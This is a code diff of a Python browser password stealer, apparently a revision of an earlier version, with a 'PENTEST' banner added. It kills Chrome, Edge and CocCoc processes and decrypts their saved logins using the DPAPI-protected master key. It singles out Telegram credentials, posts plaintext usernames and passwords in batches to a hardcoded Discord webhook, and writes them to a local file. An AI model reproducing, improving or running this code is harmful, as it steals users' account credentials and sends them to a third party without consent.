@@ -4,70 +4,70 @@ try:
     import win32crypt
     from Crypto.Cipher import AES
     HAS_CRYPTO = True
-except ImportError:
-    print("[-] Missing win32crypt/pycryptodome - Windows Chrome fail")
-    HAS_CRYPTO = False
+except:
+    HAS_CRYPTO = False; print("[-] No crypto libs")
 
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471173064002895986/8P_K4y-eq2O-wj8X6ks_i4jbKuk4p24E3RavZj_a8ZUiwva-9-ilAf2QSeRaJGK_PFvm"
-user_path = os.path.expanduser("~")
+user_path = os.path.expanduser("~"); creds = []; telegram_creds = []
+
+print("🔓 PENTEST: Browser Password Grabber")
 
 def kill_browsers():
-    """Kill browsers to unlock DBs"""
     import psutil
     killed = []
     for p in psutil.process_iter(['name']):
-        name = p.info['name'].lower()
-        if name in ['chrome.exe', 'msedge.exe', 'firefox.exe']:
-            try: p.kill(); killed.append(name)
+        if p.info['name'].lower() in ['chrome.exe', 'msedge.exe', 'firefox.exe', 'coc Coc.exe']:
+            try: p.kill(); killed.append(p.info['name'])
             except: pass
-    print(f"[+] Killed browsers: {killed}")
+    print(f"[+] Killed: {killed}")
 
-def get_key(browser_path):
-    """Get Chrome/Edge master key"""
+def get_key(browser_dir):
     if not HAS_CRYPTO: return None
     try:
-        state = os.path.join(user_path, "AppData", "Local", browser_path, "User Data", "Local State")
-        with open(state, "r", encoding="utf-8") as f:
-            key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
+        state_path = os.path.join(user_path, "AppData", "Local", browser_dir, "User Data", "Local State")
+        if not os.path.exists(state_path): return None
+        with open(state_path, 'r', encoding='utf-8') as f:
+            data = json.load(f)
+        key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
         return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
     except: return None
 
 def decrypt(pwd, key):
-    """AES-GCM decrypt"""
     try:
-        iv, payload = pwd[3:15], pwd[15:]
+        iv = pwd[3:15]; payload = pwd[15:]
         return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode()
     except: return ""
 
-creds = []; telegram_creds = []
-
-# KILL BROWSERS FIRST
+# KILL BROWSERS
 kill_browsers()
 
-# TARGET BROWSERS
-browsers = [
-    ("Chrome", "Google/Chrome", "User Data/Default/Login Data"),
-    ("Edge", "Microsoft/Edge", "User Data/Default/Login Data"),
-    ("CocCoc", "CocCoc/Browser", "User Data/Default/Login Data")
+# TARGET ALL POSSIBLE PATHS (FIXED)
+browser_configs = [
+    ("Chrome", ["Google\\Chrome", "Google/Chrome"]),
+    ("Edge", ["Microsoft\\Edge", "Microsoft/Edge"]),
+    ("CocCoc", ["CocCoc\\Browser", "CocCoc/Browser"])
 ]
 
-for name, path1, path2 in browsers:
-    db_path = os.path.join(user_path, "AppData/Local", path1, path2)
-    print(f"[*] Checking {name}: {db_path}")
+for name, paths in browser_configs:
+    key = None
+    for path in paths:
+        key = get_key(path)
+        if key: break
+    
+    if not key:
+        print(f"[-] {name} no key")
+        continue
+    
+    db_path = os.path.join(user_path, "AppData", "Local", paths[0], "User Data", "Default", "Login Data")
+    print(f"[*] {name} DB: {db_path}")
     
     if not os.path.exists(db_path):
         print(f"[-] {name} DB missing")
         continue
     
-    temp_db = f"temp_{name.lower()}.db"
+    temp_db = f"temp_{name}.db"
     try:
         shutil.copy2(db_path, temp_db)
-        key = get_key(path1.split("/")[0])
-        
-        if not key:
-            print(f"[-] {name} no key")
-            continue
-        
         conn = sqlite3.connect(temp_db)
         cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
         
@@ -76,33 +76,40 @@ for name, path1, path2 in browsers:
             if user and pwd:
                 password = decrypt(pwd, key)
                 if password:
-                    creds.append({"browser": name, "url": url, "user": user, "pass": password})
-                    if "telegram" in url.lower(): telegram_creds.append(creds[-1])
+                    cred = {"browser": name, "url": url, "user": user, "pass": password}
+                    creds.append(cred)
+                    if "telegram" in url.lower() or "t.me" in url.lower():
+                        telegram_creds.append(cred)
                     count += 1
         
         conn.close(); os.remove(temp_db)
         print(f"[+] {name}: {count} creds")
         
     except Exception as e:
-        print(f"[-] {name} error: {e}")
-        try: os.remove(temp_db)
-        except: pass
+        print(f"[-] {name} ERROR: {e}")
 
-print(f"\n🎉 TOTAL: {len(creds)} creds | Telegram: {len(telegram_creds)}")
+print(f"\n🎉 TOTAL: {len(creds)} | Telegram: {len(telegram_creds)}")
 
-# DISCORD SUMMARY (ALWAYS SEND)
-summary = f"🔓 {len(creds)} Passwords | Telegram: {len(telegram_creds)}"
+# IMMEDIATE DISCORD EXFIL
+summary = f"🔓 **{len(creds)} PASSWORDS** | Telegram: {len(telegram_creds)}"
 requests.post(DISCORD_WEBHOOK, json={"content": summary}).text
 
-# BATCH CREDENTIALS
-for i in range(0, len(creds), 10):
-    chunk = creds[i:i+10]
-    msg = "\n".join([f"{c['url'][:40]} | {c['user'][:15]} → {c['pass'][:25]}" for c in chunk])
-    requests.post(DISCORD_WEBHOOK, json={"content": f"`Batch {i//10+1}`\n```{msg}```"}).text
+# TOP 15 TO DISCORD
+top15 = creds[:15]
+preview = "\n".join([f"{c['browser']}: {c['url'].split('/')[2][:20]} | {c['user'][:15]} → {c['pass'][:20]}" for c in top15])
+requests.post(DISCORD_WEBHOOK, json={"content": f"`TOP 15:`\n```{preview}```"}).text
+
+# FULL BATCHES
+for i in range(0, len(creds), 15):
+    chunk = creds[i:i+15]
+    batch_msg = "\n".join([f"{c['url'][:35]} | {c['user'][:12]}:{c['pass'][:18]}" for c in chunk])
+    requests.post(DISCORD_WEBHOOK, json={"content": f"`Batch {i//15+1}/{len(creds)//15+1}`\n```{batch_msg}```"}).text
     time.sleep(1)
 
-# LOCAL DUMP
-with open(f"creds_{int(time.time())}.txt", "w") as f:
-    for c in creds: f.write(f"{c['browser']}: {c['url']} | {c['user']}:{c['pass']}\n")
+# LOCAL FILE
+with open(f"PENTEST_CREDS_{int(time.time())}.txt", "w", encoding="utf-8") as f:
+    f.write(f"PENTEST CREDS: {len(creds)} total\n\n")
+    for c in creds:
+        f.write(f"{c['browser']}: {c['url']} | {c['user']}:{c['pass']}\n")
 
-print("✅ Stealer complete - check Discord/files!")
+print("✅ **EXFIL COMPLETE** - Check Discord + PENTEST_CREDS_xxx.txt!")
